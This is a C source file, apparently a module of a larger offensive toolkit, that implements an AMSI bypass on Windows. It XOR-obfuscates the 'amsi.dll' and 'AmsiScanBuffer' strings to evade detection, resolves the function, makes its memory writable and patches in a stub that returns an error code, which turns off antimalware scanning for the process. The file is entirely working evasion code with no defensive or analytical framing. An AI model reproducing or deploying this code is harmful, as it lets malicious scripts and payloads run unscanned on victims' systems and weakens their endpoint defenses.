// amsi_bypass.c – Bypass do AMSI via patch
#include <windows.h>
#include <stdio.h>
#include "../../utils/logger.h"

// Obfuscated strings (XOR key 0x55)
// "amsi.dll" -> { 0x34, 0x38, 0x26, 0x3c, 0x7b, 0x31, 0x39, 0x39, 0x00 }
// "AmsiScanBuffer" -> { 0x14, 0x38, 0x26, 0x3c, 0x06, 0x36, 0x34, 0x3b, 0x17, 0x20, 0x33, 0x33, 0x30, 0x27, 0x00 }

// Helper to decrypt strings on the fly (using simple XOR logic from string_obfuscation)
void xor_decrypt(char *str, char key) {
    while (*str) { *str++ ^= key; }
}

void AMSI_Bypass() {
    // 1. Get handle to amsi.dll
    // Instead of LoadLibrary("amsi.dll"), we use obfuscated string
    char s_amsi[] = { 0x34, 0x38, 0x26, 0x3c, 0x7b, 0x31, 0x39, 0x39, 0x00 };
    xor_decrypt(s_amsi, 0x55);
    
    HMODULE hAmsi = LoadLibraryA(s_amsi);
    if (!hAmsi) {
        Log("Failed to load AMSI DLL");
        return;
    }

    // 2. Get address of AmsiScanBuffer
    char s_scanbuf[] = { 0x14, 0x38, 0x26, 0x3c, 0x06, 0x36, 0x34, 0x3b, 0x17, 0x20, 0x33, 0x33, 0x30, 0x27, 0x00 };
    xor_decrypt(s_scanbuf, 0x55);

    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, s_scanbuf);
    if (!pAmsiScanBuffer) {
        Log("Failed to find AmsiScanBuffer");
        return;
    }
    
    // 3. Patch memory
    // x64: mov eax, 0x80070057 (E_INVALIDARG); ret -> b8 57 00 07 80 c3
    // x86: mov eax, 0x80070057; ret 18 -> b8 57 00 07 80 c2 18 00
    // Simplified effective patch (x64): xor eax, eax; ret -> 31 c0 c3 (return S_OK/0)
    // Or just return a specific error code that allows execution.
    // Let's use ret instructions to disable it.

#ifdef _WIN64
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
#else
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }; // x86 ret 18
#endif

    DWORD oldProtect;
    if (VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy(pAmsiScanBuffer, patch, sizeof(patch));
        VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
        Log("AMSI patched successfully");
    } else {
        Log("Failed to change memory protection for AMSI patch");
    }
}
